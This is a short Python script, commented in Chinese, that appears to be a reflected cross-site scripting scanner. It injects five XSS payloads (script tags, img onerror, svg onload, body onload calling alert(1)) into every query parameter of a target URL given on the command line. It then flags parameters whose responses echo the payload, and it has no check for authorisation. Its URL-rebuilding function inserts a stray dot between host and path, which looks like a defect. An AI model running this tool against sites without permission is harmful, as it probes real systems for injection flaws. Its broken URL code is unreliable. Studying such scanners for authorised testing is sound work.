import requests
from urllib.parse import urlparse,parse_qs,urlencode
import sys

# 测试使用的XSS Payload列表，可自行扩展
payloads=[
     "<script>alert(1)</script>",
     "\"><script>alert(1)</script>",
     "'><img src=x onerror=alert(1)>",
     "<svg/onload=alert(1)>",
     "<body onload=alert(1)>"
 ]

#取出url参数
def extract_parameters(url):
    """
    从URL中提取参数并返回参数字典
    """
    parsed_url=urlparse(url)
    query_params=parse_qs(parsed_url.query)#query是参数部分
    return query_params

def build_url(parsed_url,params):
    """
    将参数字典重新编码为URL格式
    """
    new_query=urlencode(params,doseq=True)
    return f'{parsed_url.scheme}://{parsed_url.netloc}.{parsed_url.path}?{new_query}'

def test_payloads(url):
    """
    对URL中每个参数测试payload
    """
    parsed_url=urlparse(url)
    params=extract_parameters(url)
    
    print("[*] 正在测试目标:", url)
    
    for param in params:#遍历字典的每一个键
        original=params[param][0] if params[param] else ""
        print(f"\n[+] 正在测试参数: {param}")
        
        for payload in payloads:
            test_params=params.copy()#复制字典
            test_params[param]=payload# 替换当前参数为payload
            
            test_url=build_url(parsed_url,test_params)
            print(f"    [-] 测试 Payload: {payload}")
            
            try:
                res=requests.get(test_url,timeout=5)
                if payload in res.text:
                    print(f"[!!] 发现可能的 XSS 漏洞: 参数 [{param}] | Payload: {payload}")
                    break  # 找到就不继续测试这个参数了
            except requests.RequestException as e:
                print(f"    [x] 请求失败: {e}")
                continue
            
def main():
    if len(sys.argv)!=2:
        print("用法: python xss_scanner.py <目标URL>")
        print("示例: python xss_scanner.py \"http://test.com/index.php?query=123\"")
        sys.exit(1)
    target_url = sys.argv[1]
    test_payloads(target_url)

if __name__ == "__main__":
    main()
